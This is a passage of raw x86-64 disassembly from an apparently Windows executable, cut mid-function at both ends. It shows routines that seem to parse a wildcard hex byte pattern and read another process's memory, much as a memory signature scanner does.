   140004106:	4c 8b c0             	mov    %rax,%r8
   140004109:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000410e:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   140004115:	e8 26 dc ff ff       	call   0x140001d40
   14000411a:	48 8b cf             	mov    %rdi,%rcx
   14000411d:	ff 15 dd 5e 00 00    	call   *0x5edd(%rip)        # 0x14000a000
   140004123:	48 8b 85 70 01 00 00 	mov    0x170(%rbp),%rax
   14000412a:	48 89 03             	mov    %rax,(%rbx)
   14000412d:	48 8b 85 78 01 00 00 	mov    0x178(%rbp),%rax
   140004134:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004138:	0f 10 85 80 01 00 00 	movups 0x180(%rbp),%xmm0
   14000413f:	0f 11 43 10          	movups %xmm0,0x10(%rbx)
   140004143:	0f 10 8d 90 01 00 00 	movups 0x190(%rbp),%xmm1
   14000414a:	0f 11 4b 20          	movups %xmm1,0x20(%rbx)
   14000414e:	48 8b c3             	mov    %rbx,%rax
   140004151:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   140004158:	48 33 cc             	xor    %rsp,%rcx
   14000415b:	e8 10 47 00 00       	call   0x140008870
   140004160:	48 8b 9c 24 e8 02 00 	mov    0x2e8(%rsp),%rbx
   140004167:	00 
   140004168:	48 81 c4 b0 02 00 00 	add    $0x2b0,%rsp
   14000416f:	5f                   	pop    %rdi
   140004170:	5e                   	pop    %rsi
   140004171:	5d                   	pop    %rbp
   140004172:	c3                   	ret
   140004173:	cc                   	int3
   140004174:	cc                   	int3
   140004175:	cc                   	int3
   140004176:	cc                   	int3
   140004177:	cc                   	int3
   140004178:	cc                   	int3
   140004179:	cc                   	int3
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004185:	55                   	push   %rbp
   140004186:	56                   	push   %rsi
   140004187:	57                   	push   %rdi
   140004188:	41 54                	push   %r12
   14000418a:	41 55                	push   %r13
   14000418c:	41 56                	push   %r14
   14000418e:	41 57                	push   %r15
   140004190:	48 83 ec 60          	sub    $0x60,%rsp
   140004194:	4d 8b f0             	mov    %r8,%r14
   140004197:	4c 8b fa             	mov    %rdx,%r15
   14000419a:	48 8b f9             	mov    %rcx,%rdi
   14000419d:	48 8b 02             	mov    (%rdx),%rax
   1400041a0:	48 3b 42 08          	cmp    0x8(%rdx),%rax
   1400041a4:	74 04                	je     0x1400041aa
   1400041a6:	48 89 42 08          	mov    %rax,0x8(%rdx)
   1400041aa:	49 8b 00             	mov    (%r8),%rax
   1400041ad:	49 3b 40 08          	cmp    0x8(%r8),%rax
   1400041b1:	74 04                	je     0x1400041b7
   1400041b3:	49 89 40 08          	mov    %rax,0x8(%r8)
   1400041b7:	45 33 e4             	xor    %r12d,%r12d
   1400041ba:	4d 89 60 18          	mov    %r12,0x18(%r8)
   1400041be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400041c1:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   1400041c6:	66 0f 6f 0d a2 67 00 	movdqa 0x67a2(%rip),%xmm1        # 0x14000a970
   1400041cd:	00 
   1400041ce:	f3 0f 7f 4c 24 50    	movdqu %xmm1,0x50(%rsp)
   1400041d4:	44 88 64 24 40       	mov    %r12b,0x40(%rsp)
   1400041d9:	0f b6 01             	movzbl (%rcx),%eax
   1400041dc:	84 c0                	test   %al,%al
   1400041de:	0f 84 5f 04 00 00    	je     0x140004643
   1400041e4:	49 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r13
   1400041eb:	ff ff 7f 
   1400041ee:	66 90                	xchg   %ax,%ax
   1400041f0:	3c 20                	cmp    $0x20,%al
   1400041f2:	75 08                	jne    0x1400041fc
   1400041f4:	48 ff c7             	inc    %rdi
   1400041f7:	80 3f 20             	cmpb   $0x20,(%rdi)
   1400041fa:	74 f8                	je     0x1400041f4
   1400041fc:	0f b6 07             	movzbl (%rdi),%eax
   1400041ff:	84 c0                	test   %al,%al
   140004201:	0f 84 3c 04 00 00    	je     0x140004643
   140004207:	3c 3f                	cmp    $0x3f,%al
   140004209:	0f 85 d0 02 00 00    	jne    0x1400044df
   14000420f:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140004214:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004219:	49 8b cf             	mov    %r15,%rcx
   14000421c:	e8 df ee ff ff       	call   0x140003100
   140004221:	49 8b 16             	mov    (%r14),%rdx
   140004224:	49 8b 5e 18          	mov    0x18(%r14),%rbx
   140004228:	48 85 db             	test   %rbx,%rbx
   14000422b:	79 22                	jns    0x14000424f
   14000422d:	48 8b c3             	mov    %rbx,%rax
   140004230:	48 f7 d8             	neg    %rax
   140004233:	74 1a                	je     0x14000424f
   140004235:	48 8b c3             	mov    %rbx,%rax
   140004238:	48 f7 d0             	not    %rax
   14000423b:	48 c1 e8 05          	shr    $0x5,%rax
   14000423f:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140004246:	00 
   140004247:	48 8b ca             	mov    %rdx,%rcx
   14000424a:	48 2b c8             	sub    %rax,%rcx
   14000424d:	eb 0b                	jmp    0x14000425a
   14000424f:	48 8b c3             	mov    %rbx,%rax
   140004252:	48 c1 e8 05          	shr    $0x5,%rax
   140004256:	48 8d 0c 82          	lea    (%rdx,%rax,4),%rcx
   14000425a:	41 b8 1f 00 00 00    	mov    $0x1f,%r8d
   140004260:	48 8b c3             	mov    %rbx,%rax
   140004263:	48 2b ca             	sub    %rdx,%rcx
   140004266:	48 c1 f9 02          	sar    $0x2,%rcx
   14000426a:	48 c1 e1 05          	shl    $0x5,%rcx
   14000426e:	49 23 c0             	and    %r8,%rax
   140004271:	48 8d 2c 01          	lea    (%rcx,%rax,1),%rbp
   140004275:	49 8b c5             	mov    %r13,%rax
   140004278:	48 2b c3             	sub    %rbx,%rax
   14000427b:	48 83 f8 01          	cmp    $0x1,%rax
   14000427f:	0f 82 e0 03 00 00    	jb     0x140004665
   140004285:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000428a:	48 83 c3 20          	add    $0x20,%rbx
   14000428e:	48 c1 eb 05          	shr    $0x5,%rbx
   140004292:	49 8b 76 08          	mov    0x8(%r14),%rsi
   140004296:	48 8b ce             	mov    %rsi,%rcx
   140004299:	48 2b ca             	sub    %rdx,%rcx
   14000429c:	48 c1 f9 02          	sar    $0x2,%rcx
   1400042a0:	48 3b d9             	cmp    %rcx,%rbx
   1400042a3:	73 0a                	jae    0x1400042af
   1400042a5:	48 8d 04 9a          	lea    (%rdx,%rbx,4),%rax
   1400042a9:	49 89 46 08          	mov    %rax,0x8(%r14)
   1400042ad:	eb 43                	jmp    0x1400042f2
   1400042af:	76 41                	jbe    0x1400042f2
   1400042b1:	49 8b 46 10          	mov    0x10(%r14),%rax
   1400042b5:	48 2b c2             	sub    %rdx,%rax
   1400042b8:	48 c1 f8 02          	sar    $0x2,%rax
   1400042bc:	48 3b d8             	cmp    %rax,%rbx
   1400042bf:	76 12                	jbe    0x1400042d3
   1400042c1:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400042c6:	48 8b d3             	mov    %rbx,%rdx
   1400042c9:	49 8b ce             	mov    %r14,%rcx
   1400042cc:	e8 8f ef ff ff       	call   0x140003260
   1400042d1:	eb 1f                	jmp    0x1400042f2
   1400042d3:	48 2b d9             	sub    %rcx,%rbx
   1400042d6:	48 8d 1c 9d 00 00 00 	lea    0x0(,%rbx,4),%rbx
   1400042dd:	00 
   1400042de:	4c 8b c3             	mov    %rbx,%r8
   1400042e1:	33 d2                	xor    %edx,%edx
   1400042e3:	48 8b ce             	mov    %rsi,%rcx
   1400042e6:	e8 65 53 00 00       	call   0x140009650
   1400042eb:	48 03 f3             	add    %rbx,%rsi
   1400042ee:	49 89 76 08          	mov    %rsi,0x8(%r14)
   1400042f2:	4d 8b 46 18          	mov    0x18(%r14),%r8
   1400042f6:	4d 85 c0             	test   %r8,%r8
   1400042f9:	75 3a                	jne    0x140004335
   1400042fb:	49 8d 40 01          	lea    0x1(%r8),%rax
   1400042ff:	49 89 46 18          	mov    %rax,0x18(%r14)
   140004303:	49 8b 16             	mov    (%r14),%rdx
   140004306:	48 85 ed             	test   %rbp,%rbp
   140004309:	0f 89 33 01 00 00    	jns    0x140004442
   14000430f:	48 8b c5             	mov    %rbp,%rax
   140004312:	48 f7 d8             	neg    %rax
   140004315:	0f 84 27 01 00 00    	je     0x140004442
   14000431b:	48 8b c5             	mov    %rbp,%rax
   14000431e:	48 f7 d0             	not    %rax
   140004321:	48 c1 e8 05          	shr    $0x5,%rax
   140004325:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   14000432c:	00 
   14000432d:	48 2b d0             	sub    %rax,%rdx
   140004330:	e9 18 01 00 00       	jmp    0x14000444d
   140004335:	4d 8b 1e             	mov    (%r14),%r11
   140004338:	4d 85 c0             	test   %r8,%r8
   14000433b:	79 22                	jns    0x14000435f
   14000433d:	49 8b c0             	mov    %r8,%rax
   140004340:	48 f7 d8             	neg    %rax
   140004343:	74 1a                	je     0x14000435f
   140004345:	49 8b c0             	mov    %r8,%rax
   140004348:	48 f7 d0             	not    %rax
   14000434b:	48 c1 e8 05          	shr    $0x5,%rax
   14000434f:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140004356:	00 
   140004357:	4d 8b cb             	mov    %r11,%r9
   14000435a:	4c 2b c8             	sub    %rax,%r9
   14000435d:	eb 0b                	jmp    0x14000436a
   14000435f:	49 8b c0             	mov    %r8,%rax
   140004362:	48 c1 e8 05          	shr    $0x5,%rax
   140004366:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   14000436a:	49 8b c8             	mov    %r8,%rcx
   14000436d:	83 e1 1f             	and    $0x1f,%ecx
   140004370:	49 83 c0 01          	add    $0x1,%r8
   140004374:	4d 89 46 18          	mov    %r8,0x18(%r14)
   140004378:	79 22                	jns    0x14000439c
   14000437a:	49 8b c0             	mov    %r8,%rax
   14000437d:	48 f7 d8             	neg    %rax
   140004380:	74 1a                	je     0x14000439c
   140004382:	49 8b c0             	mov    %r8,%rax
   140004385:	48 f7 d0             	not    %rax
   140004388:	48 c1 e8 05          	shr    $0x5,%rax
   14000438c:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140004393:	00 
   140004394:	4d 8b d3             	mov    %r11,%r10
   140004397:	4c 2b d0             	sub    %rax,%r10
   14000439a:	eb 0b                	jmp    0x1400043a7
   14000439c:	49 8b c0             	mov    %r8,%rax
   14000439f:	48 c1 e8 05          	shr    $0x5,%rax
   1400043a3:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   1400043a7:	b8 1f 00 00 00       	mov    $0x1f,%eax
   1400043ac:	4c 23 c0             	and    %rax,%r8
   1400043af:	48 85 ed             	test   %rbp,%rbp
   1400043b2:	79 1f                	jns    0x1400043d3
   1400043b4:	48 8b c5             	mov    %rbp,%rax
   1400043b7:	48 f7 d8             	neg    %rax
   1400043ba:	74 17                	je     0x1400043d3
   1400043bc:	48 8b c5             	mov    %rbp,%rax
   1400043bf:	48 f7 d0             	not    %rax
   1400043c2:	48 c1 e8 05          	shr    $0x5,%rax
   1400043c6:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   1400043cd:	00 
   1400043ce:	4c 2b d8             	sub    %rax,%r11
   1400043d1:	eb 0b                	jmp    0x1400043de
   1400043d3:	48 8b c5             	mov    %rbp,%rax
   1400043d6:	48 c1 e8 05          	shr    $0x5,%rax
   1400043da:	4d 8d 1c 83          	lea    (%r11,%rax,4),%r11
   1400043de:	bb 1f 00 00 00       	mov    $0x1f,%ebx
   1400043e3:	48 8b c5             	mov    %rbp,%rax
   1400043e6:	48 23 d8             	and    %rax,%rbx
   1400043e9:	49 8b c1             	mov    %r9,%rax
   1400043ec:	4c 3b d8             	cmp    %rax,%r11
   1400043ef:	75 09                	jne    0x1400043fa
   1400043f1:	48 3b d9             	cmp    %rcx,%rbx
   1400043f4:	0f 84 09 ff ff ff    	je     0x140004303
   1400043fa:	48 85 c9             	test   %rcx,%rcx
   1400043fd:	74 05                	je     0x140004404
   1400043ff:	48 ff c9             	dec    %rcx
   140004402:	eb 09                	jmp    0x14000440d
   140004404:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140004409:	49 83 e9 04          	sub    $0x4,%r9
   14000440d:	4d 85 c0             	test   %r8,%r8
   140004410:	74 05                	je     0x140004417
   140004412:	49 ff c8             	dec    %r8
   140004415:	eb 0a                	jmp    0x140004421
   140004417:	41 b8 1f 00 00 00    	mov    $0x1f,%r8d
   14000441d:	49 83 ea 04          	sub    $0x4,%r10
   140004421:	41 8b 12             	mov    (%r10),%edx
   140004424:	b8 01 00 00 00       	mov    $0x1,%eax
   140004429:	d3 e0                	shl    %cl,%eax
   14000442b:	41 85 01             	test   %eax,(%r9)
   14000442e:	74 09                	je     0x140004439
   140004430:	44 0f ab c2          	bts    %r8d,%edx
   140004434:	41 89 12             	mov    %edx,(%r10)
   140004437:	eb b0                	jmp    0x1400043e9
   140004439:	44 0f b3 c2          	btr    %r8d,%edx
   14000443d:	41 89 12             	mov    %edx,(%r10)
   140004440:	eb a7                	jmp    0x1400043e9
   140004442:	48 8b c5             	mov    %rbp,%rax
   140004445:	48 c1 e8 05          	shr    $0x5,%rax
   140004449:	48 8d 14 82          	lea    (%rdx,%rax,4),%rdx
   14000444d:	83 e5 1f             	and    $0x1f,%ebp
   140004450:	48 8d 5d 01          	lea    0x1(%rbp),%rbx
   140004454:	48 8b c3             	mov    %rbx,%rax
   140004457:	48 c1 e8 05          	shr    $0x5,%rax
   14000445b:	48 8d 34 82          	lea    (%rdx,%rax,4),%rsi
   14000445f:	83 e3 1f             	and    $0x1f,%ebx
   140004462:	48 3b d6             	cmp    %rsi,%rdx
   140004465:	75 05                	jne    0x14000446c
   140004467:	48 3b eb             	cmp    %rbx,%rbp
   14000446a:	74 5f                	je     0x1400044cb
   14000446c:	48 8b cd             	mov    %rbp,%rcx
   14000446f:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140004475:	41 d3 e0             	shl    %cl,%r8d
   140004478:	41 f7 d0             	not    %r8d
   14000447b:	44 8b 0a             	mov    (%rdx),%r9d
   14000447e:	48 3b d6             	cmp    %rsi,%rdx
   140004481:	75 1a                	jne    0x14000449d
   140004483:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004488:	2a cb                	sub    %bl,%cl
   14000448a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000448f:	d3 e8                	shr    %cl,%eax
   140004491:	f7 d0                	not    %eax
   140004493:	41 0b c0             	or     %r8d,%eax
   140004496:	41 23 c1             	and    %r9d,%eax
   140004499:	89 02                	mov    %eax,(%rdx)
   14000449b:	eb 2e                	jmp    0x1400044cb
   14000449d:	45 23 c1             	and    %r9d,%r8d
   1400044a0:	44 89 02             	mov    %r8d,(%rdx)
   1400044a3:	48 8d 4a 04          	lea    0x4(%rdx),%rcx
   1400044a7:	4c 8b c6             	mov    %rsi,%r8
   1400044aa:	4c 2b c1             	sub    %rcx,%r8
   1400044ad:	33 d2                	xor    %edx,%edx
   1400044af:	e8 9c 51 00 00       	call   0x140009650
   1400044b4:	48 85 db             	test   %rbx,%rbx
   1400044b7:	74 12                	je     0x1400044cb
   1400044b9:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400044be:	2a cb                	sub    %bl,%cl
   1400044c0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400044c5:	d3 e8                	shr    %cl,%eax
   1400044c7:	f7 d0                	not    %eax
   1400044c9:	21 06                	and    %eax,(%rsi)
   1400044cb:	48 ff c7             	inc    %rdi
   1400044ce:	80 3f 3f             	cmpb   $0x3f,(%rdi)
   1400044d1:	0f 85 61 01 00 00    	jne    0x140004638
   1400044d7:	48 ff c7             	inc    %rdi
   1400044da:	e9 59 01 00 00       	jmp    0x140004638
   1400044df:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400044e3:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
   1400044e7:	88 44 24 25          	mov    %al,0x25(%rsp)
   1400044eb:	c6 44 24 26 00       	movb   $0x0,0x26(%rsp)
   1400044f0:	33 d2                	xor    %edx,%edx
   1400044f2:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400044f8:	48 8d 4c 24 24       	lea    0x24(%rsp),%rcx
   1400044fd:	ff 15 85 5e 00 00    	call   *0x5e85(%rip)        # 0x14000a388
   140004503:	88 44 24 20          	mov    %al,0x20(%rsp)
   140004507:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000450c:	49 8b cf             	mov    %r15,%rcx
   14000450f:	e8 ec eb ff ff       	call   0x140003100
   140004514:	49 8b 16             	mov    (%r14),%rdx
   140004517:	49 8b 4e 18          	mov    0x18(%r14),%rcx
   14000451b:	48 85 c9             	test   %rcx,%rcx
   14000451e:	79 1f                	jns    0x14000453f
   140004520:	48 8b c1             	mov    %rcx,%rax
   140004523:	48 f7 d8             	neg    %rax
   140004526:	74 17                	je     0x14000453f
   140004528:	48 8b c1             	mov    %rcx,%rax
   14000452b:	48 f7 d0             	not    %rax
   14000452e:	48 c1 e8 05          	shr    $0x5,%rax
   140004532:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140004539:	00 
   14000453a:	48 2b d0             	sub    %rax,%rdx
   14000453d:	eb 0b                	jmp    0x14000454a
   14000453f:	48 8b c1             	mov    %rcx,%rax
   140004542:	48 c1 e8 05          	shr    $0x5,%rax
   140004546:	48 8d 14 82          	lea    (%rdx,%rax,4),%rdx
   14000454a:	b8 1f 00 00 00       	mov    $0x1f,%eax
   14000454f:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140004554:	48 23 c8             	and    %rax,%rcx
   140004557:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000455c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004562:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004567:	49 8b ce             	mov    %r14,%rcx
   14000456a:	e8 d1 f3 ff ff       	call   0x140003940
   14000456f:	48 8b c8             	mov    %rax,%rcx
   140004572:	4d 8b 06             	mov    (%r14),%r8
   140004575:	48 85 c0             	test   %rax,%rax
   140004578:	79 1c                	jns    0x140004596
   14000457a:	48 f7 d8             	neg    %rax
   14000457d:	74 17                	je     0x140004596
   14000457f:	48 8b c1             	mov    %rcx,%rax
   140004582:	48 f7 d0             	not    %rax
   140004585:	48 c1 e8 05          	shr    $0x5,%rax
   140004589:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140004590:	00 
   140004591:	4c 2b c0             	sub    %rax,%r8
   140004594:	eb 0b                	jmp    0x1400045a1
   140004596:	48 8b c1             	mov    %rcx,%rax
   140004599:	48 c1 e8 05          	shr    $0x5,%rax
   14000459d:	4d 8d 04 80          	lea    (%r8,%rax,4),%r8
   1400045a1:	83 e1 1f             	and    $0x1f,%ecx
   1400045a4:	48 8d 59 01          	lea    0x1(%rcx),%rbx
   1400045a8:	48 8b c3             	mov    %rbx,%rax
   1400045ab:	48 c1 e8 05          	shr    $0x5,%rax
   1400045af:	49 8d 34 80          	lea    (%r8,%rax,4),%rsi
   1400045b3:	83 e3 1f             	and    $0x1f,%ebx
   1400045b6:	4c 3b c6             	cmp    %rsi,%r8
   1400045b9:	75 05                	jne    0x1400045c0
   1400045bb:	48 3b cb             	cmp    %rbx,%rcx
   1400045be:	74 74                	je     0x140004634
   1400045c0:	41 ba ff ff ff ff    	mov    $0xffffffff,%r10d
   1400045c6:	41 d3 e2             	shl    %cl,%r10d
   1400045c9:	45 8b ca             	mov    %r10d,%r9d
   1400045cc:	41 f7 d1             	not    %r9d
   1400045cf:	45 8b 18             	mov    (%r8),%r11d
   1400045d2:	4c 3b c6             	cmp    %rsi,%r8
   1400045d5:	75 23                	jne    0x1400045fa
   1400045d7:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400045dc:	2a cb                	sub    %bl,%cl
   1400045de:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400045e3:	d3 ea                	shr    %cl,%edx
   1400045e5:	8b c2                	mov    %edx,%eax
   1400045e7:	f7 d0                	not    %eax
   1400045e9:	41 0b c1             	or     %r9d,%eax
   1400045ec:	41 23 c3             	and    %r11d,%eax
   1400045ef:	44 23 d2             	and    %edx,%r10d
   1400045f2:	41 0b c2             	or     %r10d,%eax
   1400045f5:	41 89 00             	mov    %eax,(%r8)
   1400045f8:	eb 3a                	jmp    0x140004634
   1400045fa:	45 23 cb             	and    %r11d,%r9d
   1400045fd:	45 0b ca             	or     %r10d,%r9d
   140004600:	45 89 08             	mov    %r9d,(%r8)
   140004603:	49 8d 48 04          	lea    0x4(%r8),%rcx
   140004607:	4c 8b c6             	mov    %rsi,%r8
   14000460a:	4c 2b c1             	sub    %rcx,%r8
   14000460d:	ba ff 00 00 00       	mov    $0xff,%edx
   140004612:	e8 39 50 00 00       	call   0x140009650
   140004617:	48 85 db             	test   %rbx,%rbx
   14000461a:	74 18                	je     0x140004634
   14000461c:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004621:	2a cb                	sub    %bl,%cl
   140004623:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140004628:	d3 ea                	shr    %cl,%edx
   14000462a:	8b c2                	mov    %edx,%eax
   14000462c:	f7 d0                	not    %eax
   14000462e:	23 06                	and    (%rsi),%eax
   140004630:	0b c2                	or     %edx,%eax
   140004632:	89 06                	mov    %eax,(%rsi)
   140004634:	48 83 c7 02          	add    $0x2,%rdi
   140004638:	0f b6 07             	movzbl (%rdi),%eax
   14000463b:	84 c0                	test   %al,%al
   14000463d:	0f 85 ad fb ff ff    	jne    0x1400041f0
   140004643:	49 8b 47 08          	mov    0x8(%r15),%rax
   140004647:	49 39 07             	cmp    %rax,(%r15)
   14000464a:	0f 95 c0             	setne  %al
   14000464d:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140004654:	00 
   140004655:	48 83 c4 60          	add    $0x60,%rsp
   140004659:	41 5f                	pop    %r15
   14000465b:	41 5e                	pop    %r14
   14000465d:	41 5d                	pop    %r13
   14000465f:	41 5c                	pop    %r12
   140004661:	5f                   	pop    %rdi
   140004662:	5e                   	pop    %rsi
   140004663:	5d                   	pop    %rbp
   140004664:	c3                   	ret
   140004665:	e8 b6 f5 ff ff       	call   0x140003c20
   14000466a:	90                   	nop
   14000466b:	cc                   	int3
   14000466c:	cc                   	int3
   14000466d:	cc                   	int3
   14000466e:	cc                   	int3
   14000466f:	cc                   	int3
   140004670:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004675:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000467a:	57                   	push   %rdi
   14000467b:	48 83 ec 30          	sub    $0x30,%rsp
   14000467f:	49 8b f8             	mov    %r8,%rdi
   140004682:	48 8b f2             	mov    %rdx,%rsi
   140004685:	48 8b d9             	mov    %rcx,%rbx
   140004688:	48 85 c9             	test   %rcx,%rcx
   14000468b:	75 12                	jne    0x14000469f
   14000468d:	32 c0                	xor    %al,%al
   14000468f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004694:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004699:	48 83 c4 30          	add    $0x30,%rsp
   14000469d:	5f                   	pop    %rdi
   14000469e:	c3                   	ret
   14000469f:	ff 15 63 59 00 00    	call   *0x5963(%rip)        # 0x14000a008
   1400046a5:	4c 8b cf             	mov    %rdi,%r9
   1400046a8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400046af:	00 00 
   1400046b1:	48 8b c8             	mov    %rax,%rcx
   1400046b4:	4c 8b c6             	mov    %rsi,%r8
   1400046b7:	48 8b d3             	mov    %rbx,%rdx
   1400046ba:	ff 15 60 59 00 00    	call   *0x5960(%rip)        # 0x14000a020
   1400046c0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400046c5:	85 c0                	test   %eax,%eax
   1400046c7:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400046cc:	0f 95 c0             	setne  %al
   1400046cf:	48 83 c4 30          	add    $0x30,%rsp
   1400046d3:	5f                   	pop    %rdi
   1400046d4:	c3                   	ret
   1400046d5:	cc                   	int3
   1400046d6:	cc                   	int3
   1400046d7:	cc                   	int3
   1400046d8:	cc                   	int3
   1400046d9:	cc                   	int3
   1400046da:	cc                   	int3
   1400046db:	cc                   	int3
   1400046dc:	cc                   	int3
   1400046dd:	cc                   	int3
   1400046de:	cc                   	int3
   1400046df:	cc                   	int3
   1400046e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400046e5:	55                   	push   %rbp
   1400046e6:	56                   	push   %rsi
   1400046e7:	57                   	push   %rdi
   1400046e8:	48 83 ec 30          	sub    $0x30,%rsp
   1400046ec:	33 c0                	xor    %eax,%eax
   1400046ee:	49 63 e8             	movslq %r8d,%rbp
   1400046f1:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400046f5:	48 8b f1             	mov    %rcx,%rsi
   1400046f8:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400046fd:	48 63 fa             	movslq %edx,%rdi
   140004700:	ff 15 0a 59 00 00    	call   *0x590a(%rip)        # 0x14000a010
   140004706:	33 d2                	xor    %edx,%edx
   140004708:	b9 10 04 00 00       	mov    $0x410,%ecx
   14000470d:	44 8b c0             	mov    %eax,%r8d
   140004710:	ff 15 02 59 00 00    	call   *0x5902(%rip)        # 0x14000a018
   140004716:	48 8d 14 3e          	lea    (%rsi,%rdi,1),%rdx
   14000471a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140004720:	48 8b d8             	mov    %rax,%rbx
   140004723:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004728:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000472d:	48 8b cb             	mov    %rbx,%rcx
   140004730:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004735:	ff 15 e5 58 00 00    	call   *0x58e5(%rip)        # 0x14000a020
   14000473b:	48 8b cb             	mov    %rbx,%rcx
   14000473e:	ff 15 bc 58 00 00    	call   *0x58bc(%rip)        # 0x14000a000
   140004744:	48 63 44 24 58       	movslq 0x58(%rsp),%rax
   140004749:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000474e:	48 03 c6             	add    %rsi,%rax
   140004751:	48 03 c5             	add    %rbp,%rax
   140004754:	48 83 c4 30          	add    $0x30,%rsp
   140004758:	5f                   	pop    %rdi
   140004759:	5e                   	pop    %rsi
   14000475a:	5d                   	pop    %rbp
   14000475b:	c3                   	ret
   14000475c:	cc                   	int3
   14000475d:	cc                   	int3
   14000475e:	cc                   	int3
   14000475f:	cc                   	int3
   140004760:	48 8b c4             	mov    %rsp,%rax
   140004763:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004767:	48 89 68 18          	mov    %rbp,0x18(%rax)
   14000476b:	56                   	push   %rsi
   14000476c:	57                   	push   %rdi
   14000476d:	41 56                	push   %r14
   14000476f:	48 83 ec 70          	sub    $0x70,%rsp
   140004773:	48 83 3d 85 d8 00 00 	cmpq   $0x0,0xd885(%rip)        # 0x140012000
   14000477a:	00 
   14000477b:	0f 84 39 02 00 00    	je     0x1400049ba
   140004781:	48 83 3d 7f d8 00 00 	cmpq   $0x0,0xd87f(%rip)        # 0x140012008
   140004788:	00 
   140004789:	0f 84 2b 02 00 00    	je     0x1400049ba
   14000478f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004792:	f3 0f 7f 40 a8       	movdqu %xmm0,-0x58(%rax)
   140004797:	45 33 f6             	xor    %r14d,%r14d
   14000479a:	4c 89 70 b8          	mov    %r14,-0x48(%rax)
   14000479e:	f3 0f 7f 40 c0       	movdqu %xmm0,-0x40(%rax)
   1400047a3:	4c 89 70 d0          	mov    %r14,-0x30(%rax)
   1400047a7:	4c 89 70 d8          	mov    %r14,-0x28(%rax)
   1400047ab:	4c 8d 40 c0          	lea    -0x40(%rax),%r8
   1400047af:	48 8d 50 a8          	lea    -0x58(%rax),%rdx
   1400047b3:	e8 c8 f9 ff ff       	call   0x140004180
   1400047b8:	84 c0                	test   %al,%al
   1400047ba:	75 08                	jne    0x1400047c4
   1400047bc:	41 8b de             	mov    %r14d,%ebx
   1400047bf:	e9 e5 00 00 00       	jmp    0x1400048a9
   1400047c4:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400047c9:	48 2b 5c 24 30       	sub    0x30(%rsp),%rbx
   1400047ce:	48 8b 3d 33 d8 00 00 	mov    0xd833(%rip),%rdi        # 0x140012008
   1400047d5:	49 8b f6             	mov    %r14,%rsi
   1400047d8:	49 8b ee             	mov    %r14,%rbp
   1400047db:	48 85 ff             	test   %rdi,%rdi
   1400047de:	74 2f                	je     0x14000480f
   1400047e0:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400047e7:	ff ff 7f 
   1400047ea:	48 3b f8             	cmp    %rax,%rdi
   1400047ed:	0f 87 de 01 00 00    	ja     0x1400049d1
   1400047f3:	48 8b cf             	mov    %rdi,%rcx
   1400047f6:	e8 c5 ca ff ff       	call   0x1400012c0
   1400047fb:	48 8b f0             	mov    %rax,%rsi
   1400047fe:	48 8d 2c 38          	lea    (%rax,%rdi,1),%rbp
   140004802:	4c 8b c7             	mov    %rdi,%r8
